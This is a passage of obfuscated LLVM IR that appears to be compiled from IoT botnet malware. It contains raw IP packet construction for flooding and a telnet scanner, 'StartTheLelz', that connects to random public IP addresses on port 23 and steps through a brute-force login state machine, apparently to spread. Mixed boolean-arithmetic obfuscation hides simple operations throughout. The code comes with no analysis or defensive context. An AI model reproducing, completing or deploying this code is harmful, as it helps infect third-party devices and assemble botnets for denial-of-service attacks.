  %62 = xor i64 -1, -1
  %63 = and i64 %62, -3389379937886822560
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #4
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #4
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #1

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 %13, -1
  %15 = xor i8 -16, -1
  %16 = xor i8 36, -1
  %17 = or i8 %14, %15
  %18 = or i8 36, %16
  %19 = xor i8 %17, -1
  %20 = and i8 %19, %18
  %21 = and i8 %13, -16
  %22 = and i8 %20, 5
  %23 = xor i8 %20, 5
  %24 = or i8 %22, %23
  %25 = or i8 %20, 5
  store i8 %24, i8* %12, align 4
  %26 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %27 = bitcast %struct.iphdr* %26 to i8*
  %28 = load i8, i8* %27, align 4
  %29 = xor i8 15, -1
  %30 = xor i8 %28, %29
  %31 = and i8 %30, %28
  %32 = and i8 %28, 15
  %33 = xor i8 %31, -1
  %34 = xor i8 64, -1
  %35 = xor i8 -42, -1
  %36 = and i8 %33, -42
  %37 = and i8 %31, %35
  %38 = and i8 %34, -42
  %39 = and i8 64, %35
  %40 = or i8 %36, %37
  %41 = or i8 %38, %39
  %42 = xor i8 %40, %41
  %43 = or i8 %33, %34
  %44 = xor i8 %43, -1
  %45 = or i8 -42, %35
  %46 = and i8 %44, %45
  %47 = or i8 %42, %46
  %48 = or i8 %31, 64
  store i8 %47, i8* %27, align 4
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 1
  store i8 0, i8* %50, align 1
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = sub i64 20, %53
  %55 = add i64 20, %52
  %56 = trunc i64 %54 to i16
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 2
  store i16 %56, i16* %58, align 2
  %59 = call i32 @rand_cmwc()
  %60 = trunc i32 %59 to i16
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 3
  store i16 %60, i16* %62, align 4
  %63 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %64 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %63, i32 0, i32 4
  store i16 0, i16* %64, align 2
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 5
  store i8 -1, i8* %66, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 6
  store i8 %67, i8* %69, align 1
  %70 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %71 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %70, i32 0, i32 7
  store i16 0, i16* %71, align 2
  %72 = load i32, i32* %8, align 4
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 8
  store i32 %72, i32* %74, align 4
  %75 = load i32, i32* %7, align 4
  %76 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  store i32 %75, i32* %77, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = call i32 @getdtablesize() #4
  %14 = sdiv i32 %13, 4
  %15 = mul nsw i32 %14, 3
  store i32 %15, i32* %1, align 4
  %16 = load i32, i32* %1, align 4
  %17 = icmp sgt i32 %16, 4096
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %0
  br label %21

; <label>:19:                                     ; preds = %0
  %20 = load i32, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %19, %18
  %22 = phi i32 [ 4096, %18 ], [ %20, %19 ]
  store i32 %22, i32* %1, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %27 = getelementptr inbounds [8 x i8], [8 x i8]* %26, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 8, i32 4, i1 false)
  %28 = load i32, i32* %1, align 4
  %29 = zext i32 %28 to i64
  %30 = call i8* @llvm.stacksave()
  store i8* %30, i8** %9, align 8
  %31 = alloca %struct.telstate_t, i64 %29, align 16
  %32 = bitcast %struct.telstate_t* %31 to i8*
  %33 = load i32, i32* %1, align 4
  %34 = sext i32 %33 to i64
  %35 = mul i64 %34, 5
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 %35, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %36

; <label>:36:                                     ; preds = %55, %21
  %37 = load i32, i32* %2, align 4
  %38 = load i32, i32* %1, align 4
  %39 = icmp slt i32 %37, %38
  br i1 %39, label %40, label %60

; <label>:40:                                     ; preds = %36
  %41 = load i32, i32* %2, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %42
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i32 0, i32 3
  store i8 1, i8* %44, align 1
  %45 = call noalias i8* @malloc(i64 1024) #4
  %46 = load i32, i32* %2, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %47
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i32 0, i32 8
  store i8* %45, i8** %49, align 8
  %50 = load i32, i32* %2, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %51
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %52, i32 0, i32 8
  %54 = load i8*, i8** %53, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 1024, i32 1, i1 false)
  br label %55

; <label>:55:                                     ; preds = %40
  %56 = load i32, i32* %2, align 4
  %57 = sub i32 0, 1
  %58 = sub i32 %56, %57
  %59 = add nsw i32 %56, 1
  store i32 %58, i32* %2, align 4
  br label %36

; <label>:60:                                     ; preds = %36
  br label %61

; <label>:61:                                     ; preds = %1335, %60
  br label %62

; <label>:62:                                     ; preds = %61
  store i32 0, i32* %2, align 4
  br label %63

; <label>:63:                                     ; preds = %1329, %62
  %64 = load i32, i32* %2, align 4
  %65 = load i32, i32* %1, align 4
  %66 = icmp slt i32 %64, %65
  br i1 %66, label %67, label %1335

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* %2, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %69
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %70, i32 0, i32 2
  %72 = load i8, i8* %71, align 8
  %73 = zext i8 %72 to i32
  switch i32 %73, label %1328 [
    i32 0, label %74
    i32 1, label %227
    i32 2, label %408
    i32 3, label %497
    i32 4, label %565
    i32 5, label %692
    i32 6, label %760
    i32 7, label %908
    i32 8, label %936
    i32 9, label %964
    i32 10, label %992
    i32 100, label %1127
    i32 101, label %1155
    i32 102, label %1183
    i32 103, label %1211
  ]

; <label>:74:                                     ; preds = %67
  %75 = load i32, i32* %2, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %76
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %77, i32 0, i32 8
  %79 = load i8*, i8** %78, align 8
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 1024, i32 1, i1 false)
  %80 = load i32, i32* %2, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %81
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 3
  %84 = load i8, i8* %83, align 1
  %85 = icmp ne i8 %84, 0
  br i1 %85, label %86, label %106

; <label>:86:                                     ; preds = %74
  %87 = load i32, i32* %2, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %88
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %89, i32 0, i32 8
  %91 = load i8*, i8** %90, align 8
  store i8* %91, i8** %10, align 8
  %92 = load i32, i32* %2, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %93
  %95 = bitcast %struct.telstate_t* %94 to i8*
  call void @llvm.memset.p0i8.i64(i8* %95, i8 0, i64 32, i32 16, i1 false)
  %96 = load i8*, i8** %10, align 8
  %97 = load i32, i32* %2, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 8
  store i8* %96, i8** %100, align 8
  %101 = call i32 @getRandomPublicIP()
  %102 = load i32, i32* %2, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 1
  store i32 %101, i32* %105, align 4
  br label %152

; <label>:106:                                    ; preds = %74
  %107 = load i32, i32* %2, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 5
  %111 = load i8, i8* %110, align 1
  %112 = sub i8 0, %111
  %113 = sub i8 0, 1
  %114 = add i8 %112, %113
  %115 = sub i8 0, %114
  %116 = add i8 %111, 1
  store i8 %115, i8* %110, align 1
  %117 = load i32, i32* %2, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 5
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i64
  %123 = icmp eq i64 %122, 14
  br i1 %123, label %124, label %138

; <label>:124:                                    ; preds = %106
  %125 = load i32, i32* %2, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 5
  store i8 0, i8* %128, align 1
  %129 = load i32, i32* %2, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %130
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %131, i32 0, i32 4
  %133 = load i8, i8* %132, align 2
  %134 = sub i8 %133, -126
  %135 = add i8 %134, 1
  %136 = add i8 %135, -126
  %137 = add i8 %133, 1
  store i8 %136, i8* %132, align 2
  br label %138

; <label>:138:                                    ; preds = %124, %106
  %139 = load i32, i32* %2, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 4
  %143 = load i8, i8* %142, align 2
  %144 = zext i8 %143 to i64
  %145 = icmp eq i64 %144, 7
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %138
  %147 = load i32, i32* %2, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 3
  store i8 1, i8* %150, align 1
  br label %1329

; <label>:151:                                    ; preds = %138
  br label %152

; <label>:152:                                    ; preds = %151, %86
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %153, align 4
  %154 = call zeroext i16 @htons(i16 zeroext 23) #13
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %154, i16* %155, align 2
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %157 = getelementptr inbounds [8 x i8], [8 x i8]* %156, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %157, i8 0, i64 8, i32 4, i1 false)
  %158 = load i32, i32* %2, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  store i32 %162, i32* %164, align 4
  %165 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %166 = load i32, i32* %2, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 0
  store i32 %165, i32* %169, align 16
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 16
  %175 = icmp eq i32 %174, -1
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %152
  br label %1329

; <label>:177:                                    ; preds = %152
  %178 = load i32, i32* %2, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 16
  %183 = load i32, i32* %2, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 16
  %188 = call i32 (i32, i32, ...) @fcntl(i32 %187, i32 3, i8* null)
  %189 = and i32 %188, 2048
  %190 = xor i32 %188, 2048
  %191 = or i32 %189, %190
  %192 = or i32 %188, 2048
  %193 = call i32 (i32, i32, ...) @fcntl(i32 %182, i32 4, i32 %191)
  %194 = load i32, i32* %2, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 16
  %199 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %200 = call i32 @connect(i32 %198, %struct.sockaddr* %199, i32 16)
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %217

; <label>:202:                                    ; preds = %177
  %203 = call i32* @__errno_location() #13
  %204 = load i32, i32* %203, align 4
  %205 = icmp ne i32 %204, 115
  br i1 %205, label %206, label %217

; <label>:206:                                    ; preds = %202
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = call i32 @sclose(i32 %211)
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 3
  store i8 1, i8* %216, align 1
  br label %226

; <label>:217:                                    ; preds = %202, %177
  %218 = load i32, i32* %2, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 2
  store i8 1, i8* %221, align 8
  %222 = load i32, i32* %2, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 6
  store i32 0, i32* %225, align 4
  br label %226

; <label>:226:                                    ; preds = %217, %206
  br label %1328

; <label>:227:                                    ; preds = %67
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  %232 = load i32, i32* %231, align 4
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %234, label %240

; <label>:234:                                    ; preds = %227
  %235 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %236 = load i32, i32* %2, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 6
  store i32 %235, i32* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %234, %227
  br label %241

; <label>:241:                                    ; preds = %240
  %242 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %243 = getelementptr inbounds [16 x i64], [16 x i64]* %242, i64 0, i64 0
  %244 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %243) #4, !srcloc !5
  %245 = extractvalue { i64, i64* } %244, 0
  %246 = extractvalue { i64, i64* } %244, 1
  %247 = trunc i64 %245 to i32
  store i32 %247, i32* %11, align 4
  %248 = ptrtoint i64* %246 to i64
  %249 = trunc i64 %248 to i32
  store i32 %249, i32* %12, align 4
  br label %250

; <label>:250:                                    ; preds = %241
  br label %251

; <label>:251:                                    ; preds = %250
  %252 = load i32, i32* %2, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 16
  %257 = srem i32 %256, 64
  %258 = zext i32 %257 to i64
  %259 = shl i64 1, %258
  %260 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %261 = load i32, i32* %2, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %262
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %263, i32 0, i32 0
  %265 = load i32, i32* %264, align 16
  %266 = sdiv i32 %265, 64
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 %267
  %269 = load i64, i64* %268, align 8
  %270 = xor i64 %269, -1
  %271 = xor i64 %259, -1
  %272 = xor i64 -3286908045946503594, -1
  %273 = and i64 %270, -3286908045946503594
  %274 = and i64 %269, %272
  %275 = and i64 %271, -3286908045946503594
  %276 = and i64 %259, %272
  %277 = or i64 %273, %274
  %278 = or i64 %275, %276
  %279 = xor i64 %277, %278
  %280 = or i64 %270, %271
  %281 = xor i64 %280, -1
  %282 = or i64 -3286908045946503594, %272
  %283 = and i64 %281, %282
  %284 = or i64 %279, %283
  %285 = or i64 %269, %259
  store i64 %284, i64* %268, align 8
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %286, align 8
  %287 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %287, align 8
  %288 = load i32, i32* %2, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 16
  %293 = sub i32 %292, 1049828608
  %294 = add i32 %293, 1
  %295 = add i32 %294, 1049828608
  %296 = add nsw i32 %292, 1
  %297 = call i32 @select(i32 %295, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %297, i32* %3, align 4
  %298 = load i32, i32* %3, align 4
  %299 = icmp eq i32 %298, 1
  br i1 %299, label %300, label %360

; <label>:300:                                    ; preds = %251
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %301 = load i32, i32* %2, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = bitcast i32* %7 to i8*
  %307 = call i32 @getsockopt(i32 %305, i32 1, i32 4, i8* %306, i32* %6) #4
  %308 = load i32, i32* %7, align 4
  %309 = icmp ne i32 %308, 0
  br i1 %309, label %310, label %325

; <label>:310:                                    ; preds = %300
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = call i32 @sclose(i32 %315)
  %317 = load i32, i32* %2, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 2
  store i8 0, i8* %320, align 8
  %321 = load i32, i32* %2, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 3
  store i8 1, i8* %324, align 1
  br label %359

; <label>:325:                                    ; preds = %300
  %326 = load i32, i32* %2, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %327
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %328, i32 0, i32 0
  %330 = load i32, i32* %329, align 16
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  %335 = load i32, i32* %334, align 16
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %335, i32 3, i8* null)
  %337 = xor i32 -2049, -1
  %338 = xor i32 %336, %337
  %339 = and i32 %338, %336
  %340 = and i32 %336, -2049
  %341 = call i32 (i32, i32, ...) @fcntl(i32 %330, i32 4, i32 %339)
  %342 = load i32, i32* %2, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 6
  store i32 0, i32* %345, align 4
  %346 = load i32, i32* %2, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 7
  store i16 0, i16* %349, align 16
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 8
  %354 = load i8*, i8** %353, align 8
